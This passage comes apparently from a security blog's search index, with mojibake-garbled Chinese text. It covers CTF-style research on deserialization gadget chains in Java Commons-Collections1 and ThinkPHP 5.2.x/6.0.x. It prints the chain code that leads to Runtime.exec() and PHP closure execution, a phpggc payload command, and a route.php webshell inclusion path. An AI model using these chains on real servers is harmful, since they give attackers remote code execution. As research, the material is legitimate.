iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); &#125;&#125; æ­¤å¤„ç”¨çš„å°±æ˜¯Javaçš„åå°„æœºåˆ¶ï¼ŒåŠ¨æ€è°ƒç”¨ç±»å’Œæ–¹æ³•ã€‚ä¸ºäº†èƒ½åŠ¨æ€è°ƒç”¨ä»»æ„ç±»å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¾—æ§åˆ¶iMethodNameã€iParamTypesã€iArgsï¼Œè¯¥ç±»å±æ€§å®šä¹‰åœ¨InvokerTransformerçš„æ„é€ å‡½æ•°ä¸Š 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125; é‚£ä¹ˆæ¥ä¸‹æ¥å°±è·Ÿphpç±»ä¼¼äº†ï¼Œæ‰¾ä¸€ä¸ªç±»ï¼Œå®ƒçš„ç±»å±æ€§å¯æ§ï¼Œä¸”è¯¥ç±»å±æ€§åç»­è¿˜ä¼šè°ƒç”¨transformå‡½æ•°ã€‚ç”±äºå®ŒæˆRuntime.getRuntime().exec()åŠ¨ä½œéœ€è¦å¤šæ¬¡è°ƒç”¨transformå‡½æ•°ï¼ˆå…ˆè°ƒç”¨Runtime.getRuntimeå†è°ƒç”¨Runtime.execï¼‰ï¼Œæ‰€ä»¥è¿˜å¾—æ‰¾ä¸€ä¸ªèƒ½å¤šæ¬¡è°ƒç”¨transformçš„åœ°æ–¹ï¼Œæ¥çœ‹ä¸€ä¸‹ChainedTransformer 12345678private final Transformer[] iTransformers;// å¡«å……æ„é€ åçš„å®ä¾‹public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object);// è°ƒç”¨é“¾ï¼Œ &#125; return object;&#125; åœ¨Transformerçš„å­ç±»ä¸‹é¢æ‰¾åˆ°èƒ½ç”Ÿæˆå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨é“¾å³å¯ï¼Œæ¥åˆ†æä¸€ä¸‹CommonCollections1çš„æ„é€  123456789101112// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),// è·å–Runtimeå¯¹è±¡ new InvokerTransformer(\"getMethod\", new Class[] &#123;//è·å–Runtime.getRuntime()æ–¹æ³•å¯¹è±¡ String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;// åå°„è°ƒç”¨invoke,å†invokeæ‰§è¡ŒRuntime.getRuntime()æ–¹æ³•ï¼Œè·å–Runtimeå®ä¾‹åŒ–å¯¹è±¡ Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\",// åå°„è°ƒç”¨execæ–¹æ³•ï¼Œæ‰§è¡Œæœ€ç»ˆçš„å‘½ä»¤ new Class[] &#123; String.class &#125;, execArgs), new ConstantTransformer(1) &#125;; é“¾çš„ç¬¬ä¸€ä¸ªç»“ç‚¹é€‰ç”¨çš„æ˜¯ConstantTransformerï¼Œå…¶transformerç›´æ¥è¿”å›æ„é€ æ—¶çš„å¯¹è±¡ 123456789private final Object iConstant;// æ­¤æ—¶iConstantç½®ä¸ºRuntime.classpublic ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;// ç›´æ¥è¿”å›Runtime.class return iConstant;&#125; æœ€ç»ˆçš„è°ƒç”¨ï¼Œç±»ä¼¼ 1234567891011Object obj = Runtime.class;Class cls = obj.getClass();Method method;method = cls.getMethod(\"getMethod\",new Class[] &#123;String.class, Class[].class &#125;);obj = method.invoke(obj, new Object[] &#123;\"getRuntime\", new Class[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"invoke\",new Class[] &#123;Object.class, Object[].class &#125;);obj = method.invoke(obj, new Object[] &#123;null, new Object[0] &#125;);cls = obj.getClass();method = cls.getMethod(\"exec\",new Class[] &#123; String.class &#125;);method.invoke(obj, new String[] &#123; \"open /System/Applications/Calculator.app\" &#125;); æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯å¦‚ä½•è§¦å‘ChainedTransformerï¼Ÿæœç´¢ä¸€ä¸‹è°ƒç”¨transformçš„ä½ç½®ï¼Œæ’é™¤æ‰xxxTransformerç±»ï¼Œæœ€æœ‰å¯èƒ½è¢«åˆ©ç”¨çš„å°±æ˜¯LazyMap.getã€TransformedMap.checkSetValueï¼Œå…¶ä¸­checkSetValueä¼šåœ¨setValueå‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™è°ƒç”¨ã€‚ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾èƒ½è§¦å‘ä¸Šé¢ä¸¤ä¸ªåˆ©ç”¨æ–¹å¼çš„æ–¹æ³•ã€‚ åŒæ ·çš„ï¼Œå‰é¢åŸºç¡€çŸ¥è¯†æåˆ°ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡çš„readObjectå‡½æ•°è¢«é‡è½½äº†ï¼Œä¼šä¼˜å…ˆè°ƒç”¨é‡è½½åçš„readObjectå‡½æ•°ã€‚ æˆ‘ä»¬æœ€å¥½èƒ½åœ¨è¢«é‡è½½çš„readObjectå‡½æ•°ä¸­å‘ç°ç›¸å…³å¯æ§Mapæ•°æ®çš„æ“ä½œ(getå’ŒsetValue)ã€‚ è€Œexpä¸­sun.reflect.annotation.AnnotationInvocationHandleréå¸¸ç¬¦åˆä¸Šè¿°çš„æè¿°ã€‚ æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„readObjectå®ç° 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; åœ¨ç¬¬26è¡Œå¤„ï¼Œè°ƒç”¨äº†memberValue.setValueï¼Œè¿™é‡Œçš„memberValueæˆ‘ä»¬å¯ä»¥å°†å…¶ç½®ä¸ºæ„é€ å¥½çš„TransformedMapå®ä¾‹ã€‚ åœ¨è¿™ä¸ªTransformedMapå®ä¾‹ä¸Šï¼ŒvalueTransformerå±æ€§è¢«ç½®ä¸ºå‰æ–‡çš„ChainedTransformerã€‚è¿™æ ·è¿™ä¸ªé“¾å°±ä¸²èµ·æ¥äº†ï¼Œæ€»ç»“ä¸€ä¸‹ 1234sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue() -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() ç¬¬äºŒç§ï¼Œåˆ©ç”¨LazyMap.get() CommonsCollections1ä¸­åˆ©ç”¨äº†AnnotationInvocationHandler.invokeå‡½æ•° 123456789101112131415161718public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); // ... switch(member) &#123; case \"toString\": return toStringImpl(); case \"hashCode\": return hashCodeImpl(); case \"annotationType\": return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); // ...&#125; ç¬¬15è¡Œè°ƒç”¨äº†memberValues.getå‡½æ•°ï¼Œè¿™é‡Œå¦‚æœmemberValuesè®¾ç½®ä¸ºæ„é€ å¥½çš„LazyMapå®ä¾‹ï¼Œå°†è§¦å‘è¯¥åˆ©ç”¨é“¾çš„æ‰§è¡Œã€‚ é‚£ä¹ˆæ€ä¹ˆæ¥è°ƒç”¨invokeå‡½æ•°å‘¢ï¼Ÿè¿™é‡Œç”¨åˆ°äº†ProxyåŠ¨æ€ä»£ç†æœºåˆ¶ã€‚åœ¨è¯¥æœºåˆ¶ä¸‹è¢«ä»£ç†çš„å®ä¾‹ä¸ç®¡è°ƒç”¨ä»€ä¹ˆç±»æ–¹æ³•ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨invokeå‡½æ•°ã€‚ é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ProxyåŠ¨æ€ä»£ç†AnnotationInvocationHandlerï¼Œå¹¶å°†memberValuesè®¾ç½®ä¸ºLazyMapã€‚åœ¨AnnotationInvocationHandler.readObjectå‡½æ•°é‡Œï¼Œç¬¬19è¡Œè°ƒç”¨äº†memberValues.entrySetå‡½æ•°ã€‚åœ¨åŠ¨æ€ä»£ç†ä¸‹ä¼šå…ˆè°ƒç”¨invokeå‡½æ•°ï¼Œä¸”æ­¤æ—¶çš„å‡½æ•°åentrySetä¸åœ¨toStringã€hashCodeã€annotationTypeé‡Œï¼Œé‚£ä¹ˆä¼šæœ€ç»ˆèµ°åˆ°ç¬¬15è¡Œçš„ä½ç½®ã€‚æ€»ç»“ä¸€ä¸‹è¿™ä¸ªè°ƒç”¨é“¾ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() è¿™ä¹Ÿæ˜¯ysoserialçš„CommonsCollections1çš„è°ƒç”¨é“¾ã€‚ åç»­çš„åˆ©ç”¨é“¾åˆ†ææ”¾åœ¨ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œã€‚ 0x04 æ€»ç»“ç»è¿‡å¯¹ysoserialå·¥å…·ç”Ÿæˆçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„è°ƒè¯•ï¼Œç†Ÿæ‚‰äº†Javaçš„ååºåˆ—åŒ–çš„ä¸€ä¸ªæµç¨‹ã€‚ä½†å¯¹äºexpçš„ä¹¦å†™ä»ç„¶æœ‰å¾…æé«˜ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCommonCollections1å’Œ3ç”¨çš„override.classä½œä¸ºAnnotationåœ¨jdk8ä¸Šæ˜¯ä¸é€‚ç”¨çš„ï¼Œè¦è°ƒè¯•è¿™ä¸¤ä¸ªpayloadéœ€è¦ç”¨jdk7ï¼Œå‚è€ƒ é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œä½“ä¼šåˆ°äº†javassiståº“çš„å¼ºå¤§ï¼Œä¿®æ”¹jaråŒ…é‡Œçš„classæ–‡ä»¶éå¸¸èˆ’æœï¼ Proxyçš„åŠ¨æ€ä»£ç†æœºåˆ¶ï¼ŒJavaçš„åå°„æœºåˆ¶ç›¸ä¿¡ä¼šæ˜¯åç»­å­¦ä¹ çš„ä¸€ä¸ªé‡ç‚¹ï¼Œç»§ç»­ğŸ’ªï¼"},{"title":"thinkphp v5.2.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-5-2-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/","text":"0x00 å‰è¨€ä¸Šå‘¨å‚ä¸äº†N1CTFï¼Œé‡Œé¢æœ‰ä¸€é“å…³äºthinkphp5çš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚è®°å½•ä¸€ä¸‹å…³äºè¯¥ååºåˆ—åŒ–çš„åˆ©ç”¨é“¾åˆ†æã€‚ åæ–‡ä¸»è¦åŒ…æ‹¬ä¸¤æ¡é“¾çš„åˆ©ç”¨åˆ†æï¼ˆä¸€æ¡æ˜¯æˆ‘æ‰¾çš„ï¼Œä¹Ÿæ˜¯é¢˜ç›®çš„é¢„æœŸè§£ï¼Œå¦ä¸€æ¡æ˜¯wonderkunå¸ˆå‚…æ‰¾çš„éé¢„æœŸè§£ï¼‰ 0x01 ç¯å¢ƒå‡†å¤‡è¿™é‡Œå°±ä¸ç›´æ¥ç”¨é¢˜ç›®çš„ç¯å¢ƒäº†ï¼Œé‡‡ç”¨composerç›´æ¥å®‰è£…5.2.*-devç‰ˆæœ¬ 1composer create-project topthink/think=5.2.x-dev v5.2 0x02 åˆ©ç”¨é“¾åˆ†æèƒŒæ™¯å›é¡¾tp5åœ¨æˆ‘å°è±¡é‡Œååºåˆ—åŒ–çš„åˆ©ç”¨é“¾å­˜åœ¨ä¸€ä¸ªWindowsç±»çš„ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œä½†æ˜¯åœ¨è¿™ç¯‡æ–‡ç« )çš„å¯ç¤ºä¸‹ï¼Œä¹Ÿç®—æ˜¯æ‰¾åˆ°äº†ä¸€æ¡æ–°çš„è·¯ï¼ˆå…³äº__toStringçš„è§¦å‘æ–¹å¼ï¼Œé™¤äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥åˆ©ç”¨PHPè‡ªå¸¦å‡½æ•°å‚æ•°çš„å¼ºåˆ¶è½¬æ¢ï¼‰ã€‚ è¿™ç¯‡æ–‡ç« çš„åˆ©ç”¨é“¾æœ€åç”¨åˆ°äº†5.1.37ç‰ˆæœ¬think/Request.phpçš„ __callå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è°ƒç”¨å‡½æ•°åå¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å¯¼è‡´ä»»æ„è°ƒç”¨å…¶ä»–çš„ç±»å‡½æ•°ã€‚è€Œåœ¨5.2.xç‰ˆæœ¬ä¸å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ª__callå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªæœ€ç»ˆè¾¾æˆå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è°ƒç”¨ï¼ˆ__callå‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å¯ç”¨ï¼‰ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹5.2.xæ–°çš„åˆ©ç”¨é“¾å§ï¼šï¼‰ think/model/concern/Attribute.php getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰ç”±äº5.1.37__callå‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å­˜åœ¨äº5.2.xç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ä¸å†è¯¦è¿°äº†ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹Conversionç±»çš„toArrayå‡½æ•° 123456789101112131415public function toArray(): array&#123; // ... // åˆå¹¶å…³è”æ•°æ® $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // ... &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key);// relationå’Œvisibleå­˜åœ¨åŒä¸€ä¸ªkeyå°±è¡Œ // ... &#125; // ... å»æ‰äº†æ— å…³çš„ä»£ç ï¼Œè¿™é‡Œ$this-&gt;visibleã€$this-&gt;relationå‡å¯æ§ï¼Œå¯ä¼ªé€ æ•°æ®è¿›å…¥getAttrå‡½æ•° 12345678910111213141516public function getAttr(string $name)&#123; // ... return $this-&gt;getValue($name, $value, $relation);&#125;protected function getValue(string $name, $value, bool $relation = false)&#123; // æ£€æµ‹å±æ€§è·å–å™¨ $fieldName = $this-&gt;getRealFieldName($name);// ç›´æ¥è¿”å›$nameçš„å€¼ // ... if (isset($this-&gt;withAttr[$fieldName])) &#123; // ... $closure = $this-&gt;withAttr[$fieldName]; // withAttrå†…å®¹å¯æ§ $value = $closure($value, $this-&gt;data); // åŠ¨æ€è°ƒç”¨å‡½æ•° // ... ç›´æ¥å…³æ³¨getValueå‡½æ•°ï¼Œè¯¥å‡½æ•°å¯åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°ã€å‡½æ•°å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯æ‰¾ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„phpå‡½æ•°ï¼Œå¦ä¸€ç§æ˜¯åˆ©ç”¨tpè‡ªå¸¦çš„SerializableClosureè°ƒç”¨ï¼Œæ¥çœ‹ä¸€ä¸‹ç¬¬äºŒç§ã€‚ \\Opis\\Closureå¯ç”¨äºåºåˆ—åŒ–åŒ¿åå‡½æ•°ï¼Œä½¿å¾—åŒ¿åå‡½æ•°åŒæ ·å¯ä»¥è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç„¶åäº¤ç”±ä¸Šè¿°çš„$closure($value, $this-&gt;data)è°ƒç”¨æ‰§è¡Œã€‚ 123$func = function()&#123;phpinfo();&#125;;$closure = new \\Opis\\Closure\\SerializableClosure($func);$closure($value, $this-&gt;data);// è¿™é‡Œçš„å‚æ•°å¯ä»¥ä¸ç”¨ç®¡ ä»¥ä¸Šè¿°ä»£ç ä¸ºä¾‹ï¼Œå°†è°ƒç”¨phpinfoå‡½æ•°ã€‚ åˆ°æ­¤ä¸ºæ­¢ï¼Œæˆ‘ä»¬åˆ†æå®Œäº†æ•´ä¸€ä¸ªè°ƒç”¨æµç¨‹ï¼Œå›é¡¾ä¸€ä¸‹ vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct -&gt;removeFiles -&gt;file_exists å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²filenameï¼Œè¿™é‡Œçš„filenameå¯æ§ å¯è§¦å‘__toStringå‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„__toString vendor/topthink/framework/src/think/model/concern/Conversion.php __toString -&gt; toJson -&gt; toArrayåˆ›é€ ç¬¦åˆæ¡ä»¶çš„relationå’Œvisible-&gt; getAttr ä¸‹ä¸€æ­¥è°ƒç”¨vendor/topthink/framework/src/think/model/concern/Attribute.phpçš„getValueå‡½æ•° vendor/topthink/framework/src/think/model/concern/Attribute.phpgetValue -&gt; $closureåŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œä¸”è¯¥å†…å®¹å¯æ§ä¸‹ä¸€æ­¥åˆ©ç”¨æœ‰ä¸¤ç§ï¼Œä¸€ç§æ‰¾ç¬¦åˆçš„phpå‡½æ•°ï¼Œå¦ä¸€ç§åˆ©ç”¨tpè‡ªå¸¦çš„SerializableClosureè°ƒç”¨ vendor/opis/closure/src/SerializableClosure.phpæ„é€ å¯åˆ©ç”¨çš„åŒ¿åå‡½æ•° æˆ‘æŠŠexpé›†æˆåˆ°äº†phpggcä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ 1./phpggc -u ThinkPHP/RCE1 'phpinfo();' è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚ think/Db.php __callå‡½æ•°å¯å®ä¾‹åŒ–ä»»æ„ç±»ï¼ˆé¢˜ç›®çš„éé¢„æœŸè§£ï¼‰å‰é¢è¯´åˆ°5.1.37ç‰ˆæœ¬çš„åˆ©ç”¨é“¾çš„__callå‡½æ•°ï¼Œåœ¨5.2.xç‰ˆæœ¬æ²¡åŠæ³•ç”¨äº†ã€‚ä½†æ˜¯ä»__destructåˆ°__callçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæˆ‘ä»¬åªéœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ç”¨çš„__callå‡½æ•°å³å¯ã€‚ æ¥çœ‹ä¸€ä¸‹vendor/topthink/framework/src/think/Db.phpçš„__callå‡½æ•° 12345678public function __call($method, $args)&#123; $class = $this-&gt;config['query']; $query = new $class($this-&gt;connection); return call_user_func_array([$query, $method], $args);&#125; $this-&gt;configå’Œ$this-&gt;connectionå‡å¯æ§ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„ç¬¦åˆæ¡ä»¶çš„ç±»ï¼Œè¿™é‡Œæ‰¾äº†think\\Url 12345678910public function __construct(App $app, array $config = [])&#123; $this-&gt;app = $app; $this-&gt;config = $config; if (is_file($app-&gt;getRuntimePath() . 'route.php')) &#123; // è¯»å–è·¯ç”±æ˜ å°„æ–‡ä»¶ $app-&gt;route-&gt;import(include $app-&gt;getRuntimePath() . 'route.php'); &#125;&#125; è¯¥æ„é€ å™¨å¼•å…¥äº†RuntimePathä¸‹çš„route.phpæ–‡ä»¶ï¼Œå› ä¸ºè¿™é“é¢˜æ˜¯å…è®¸ä¸Šä¼ æ–‡ä»¶çš„ï¼Œæ‰€ä»¥åªè¦åœ¨å¯ä¸Šä¼ çš„ç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ªroute.phpçš„webshellå³å¯ã€‚è‡³äºRuntimePathï¼Œ$appä¸ºå¯æ§å˜é‡ï¼Œç›´æ¥ä¿®æ”¹$runtimePathçš„å†…å®¹å³å¯ã€‚ æˆ‘ä»¬ç›´æ¥æ„é€ Appå¯¹è±¡ä¸º 123456789class App&#123; protected $runtimePath; public function __construct(string $rootPath = '')&#123; $this-&gt;rootPath = $rootPath; $this-&gt;runtimePath = \"/tmp/\"; $this-&gt;route = new \\think\\route\\RuleName(); &#125;&#125; è¿™ä¸ªæ„é€ æ€è·¯å¤ªæºœäº†ï¼Œè†œä¸€æ³¢ï¼šï¼‰ æ•´ç†ä¸€ä¸‹è¿‡ç¨‹ vendor/topthink/framework/src/think/process/pipes/Windows.php__destruct -&gt;removeFiles -&gt;file_exists å¼ºåˆ¶è½¬åŒ–å­—ç¬¦ä¸²filenameï¼Œè¿™é‡Œçš„filenameå¯æ§å¯è§¦å‘__toStringå‡½æ•°ï¼Œä¸‹ä¸€æ­¥æ‰¾å¯åˆ©ç”¨çš„__toString vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -&gt; toJson -&gt; toArray-&gt;appendAttrToArray-&gt;$relationè°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°ï¼Œè§¦å‘__call vendor/topthink/framework/src/think/Db.php__call -&gt; new $class($this-&gt;connection) è°ƒç”¨ä»»æ„ç±»çš„__constructå‡½æ•° vendor/topthink/framework/src/think/Url.phpæ„é€ Appç±»ï¼Œè¾¾åˆ°includeä»»æ„æ–‡ä»¶çš„æ•ˆæœ"},{"title":"thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜","permalink":"http://blog.0kami.cn/2019/09/10/php-thinkphp-6-0-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/","text":"0x00 å‰è¨€ä¸Šä¸€ç¯‡åˆ†æäº†tp 5.2.xçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ï¼Œé¡ºç€æ€è·¯ï¼ŒæŠŠtp6.0.xä¹ŸæŒ–äº†ã€‚æœ‰ç±»ä¼¼çš„åœ°æ–¹ï¼Œä¹Ÿæœ‰éœ€è¦é‡æ–°æŒ–æ˜çš„åœ°æ–¹ã€‚ 0x01 ç¯å¢ƒå‡†å¤‡é‡‡ç”¨composerå®‰è£…6.0.*-devç‰ˆæœ¬ 1composer create-project topthink/think=6.0.x-dev v6.0 0x02 åˆ©ç”¨é“¾åˆ†æèƒŒæ™¯å›é¡¾æ‹¿åˆ°v6.0.xç‰ˆæœ¬ï¼Œç®€å•çš„çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªå¥½æ¶ˆæ¯å’Œä¸€ä¸ªåæ¶ˆæ¯ã€‚ å¥½æ¶ˆæ¯æ˜¯5.2.xç‰ˆæœ¬å‡½æ•°åŠ¨æ€è°ƒç”¨çš„ååºåˆ—åŒ–é“¾ååŠéƒ¨åˆ†ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ã€‚ åæ¶ˆæ¯æ˜¯å‰é¢5.1.xï¼Œ5.2.xç‰ˆæœ¬éƒ½åŸºäºè§¦å‘ç‚¹Windowsç±»çš„__destruct,å¥½å·§ä¸å·§çš„æ˜¯6.0.xç‰ˆæœ¬å–æ¶ˆäº†Windowsç±»ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¾—é‡æ–°æ‰¾ä¸€ä¸ªåˆé€‚çš„èµ·å§‹è§¦å‘ç‚¹ï¼Œæ‰èƒ½ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„å¥½æ¶ˆæ¯ã€‚ vendor/topthink/think-orm/src/Model.php æ–°èµ·å§‹è§¦å‘ç‚¹ä¸ºäº†èŠ‚çœç¯‡å¹…ï¼Œåæ–‡ä¸å†é‡å¤ä»‹ç»è§¦å‘__toStringå‡½æ•°åçš„åˆ©ç”¨é“¾ï¼Œè¿™éƒ¨åˆ†åŒ5.2.xç‰ˆæœ¬ç›¸åŒ(ä¸è¿‡wonderkunå¸ˆå‚…çš„åˆ©ç”¨é“¾å·²å¤±æ•ˆï¼ŒåŠ¨æ€å‡½æ•°è°ƒç”¨çš„åˆ©ç”¨é“¾è¿˜èƒ½ç”¨)ã€‚ é€šå¸¸æœ€å¥½çš„ååºåˆ—åŒ–èµ·å§‹ç‚¹ä¸º__destructã€__wakeupï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥æ‰¾æ­¤ç±»å‡½æ•°ã€‚è¿™é‡Œæˆ‘æ‰¾äº†vendor/topthink/think-orm/src/Model.phpçš„__destructå‡½æ•°ã€‚ 1234567891011121314151617public function __destruct()&#123; if ($this-&gt;lazySave) &#123;// æ„é€ lazySaveä¸ºtrueï¼Œè¿›å…¥saveå‡½æ•° $this-&gt;save(); &#125;&#125;public function save(array $data = [], string $sequence = null): bool&#123; // ... if ($this-&gt;isEmpty() || false === $this-&gt;trigger('BeforeWrite')) &#123; return false; &#125; $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); // ...&#125; é¦–å…ˆæ„é€ lazySaveçš„å€¼ä¸ºtrue,ä»è€Œè¿›å…¥saveå‡½æ•°ã€‚ è¿™æ¬¡è§¦å‘ç‚¹ä½äºupdateDataå‡½æ•°å†…ï¼Œä¸ºäº†é˜²æ­¢å‰é¢çš„æ¡ä»¶ç¬¦åˆï¼Œè€Œç›´æ¥returnï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ„é€ ç›¸å…³å‚æ•° 1234567891011public function isEmpty(): bool&#123; return empty($this-&gt;data);&#125;protected function trigger(string $event): bool&#123; if (!$this-&gt;withEvent) &#123; return true; &#125; // ... å…¶ä¸­éœ€ä¿è¯isEmptyè¿”å›falseï¼Œä»¥åŠ$this-&gt;trigger(&#39;BeforeWrite&#39;)è¿”å›true æ„é€ $this-&gt;dataä¸ºéç©ºæ•°ç»„ æ„é€ $this-&gt;withEventä¸ºfalse æ„é€ $this-&gt;existsä¸ºtrue ä»è€Œè¿›å…¥æˆ‘ä»¬éœ€è¦çš„updateDataå‡½æ•°ï¼Œæ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°å†…å®¹ 12345678910111213141516171819202122protected function updateData(): bool&#123; // äº‹ä»¶å›è°ƒ if (false === $this-&gt;trigger('BeforeUpdate')) &#123;// æ­¤å¤„å‰é¢å·²ç¬¦åˆæ¡ä»¶ return false; &#125; // ... // è·å–æœ‰æ›´æ–°çš„æ•°æ® $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // å…³è”æ›´æ–° if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; // ... // æ£€æŸ¥å…è®¸å­—æ®µ $allowFields = $this-&gt;checkAllowFields(); // è§¦å‘__toString åŒæ ·çš„ï¼Œä¸ºäº†é˜²æ­¢æå‰returnï¼Œéœ€è¦ç¬¦åˆ$dataéç©ºï¼Œæ¥çœ‹ä¸€ä¸‹getChangedData 1234567891011121314public function getChangedData(): array&#123; $data = $this-&gt;force ? $this-&gt;data : 